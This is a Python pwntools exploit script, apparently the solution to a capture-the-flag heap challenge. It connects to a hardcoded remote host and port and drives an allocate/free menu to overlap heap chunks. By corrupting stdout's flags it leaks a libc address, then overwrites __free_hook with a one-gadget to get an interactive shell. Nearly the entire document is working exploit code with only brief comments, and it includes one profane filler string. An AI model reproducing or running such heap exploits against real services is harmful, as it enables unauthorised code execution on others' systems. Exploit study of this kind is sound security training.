#!/usr/bin/env python

# -*- coding: utf-8 -*-
from pwn import *

host = "10.211.55.19"
host = "52.68.236.186"
port = 56746

r = remote(host,port)


def allocate(size,data):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil("e:")
    r.sendline(str(size))
    r.recvuntil("a:")
    r.send(data)

def free(idx):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil("x:")
    r.sendline(str(idx))


# intended solution :
# Use last_remainder to bypass prev_size v.s. size check
# leak : partial overwrite fd and let it point to stdout->_flag   //just need to brute force 4 bit
#        When you call puts, it will print the value in the stdout structure.

for i in range(6):
    allocate(0x80,"a")

allocate(0x38,"a") #6
allocate(0x4e0+0x490,"b") #7
allocate(0x410,"c") #8
allocate(0x80,"d") #9
free(7)
free(6)
allocate(0x68,"c"*0x68) #6
allocate(0x80,"d"*0x78) #7
free(5)
allocate(0x60,"da") #5
for i in range(5) :
    free(i)
free(9)
free(7)
free(8)
allocate(0x90,"ccc")
allocate(0x7f0-0xa0,"d")
allocate(0x50,"d")
free(5)
allocate(0x30,"a")
allocate(0x20,"a")
allocate(0x20,"\x60\x57")
allocate(0x60,"da")
allocate(0x60,p64(0xfbad3c80) + p64(0)*3 + "\x00")
libc = u64(r.recvuntil("$$")[8:16]) - 0x3ed8b0
print hex(libc)
free(5)
free(7)
free_hook = libc + 0x3ed8e8
allocate(0x20,p64(free_hook))
allocate(0x20,"fuck\x00")
system = libc + 0x4f440
magic = libc  +0x4f322
allocate(0x20,p64(magic))
free(5)
r.interactive()


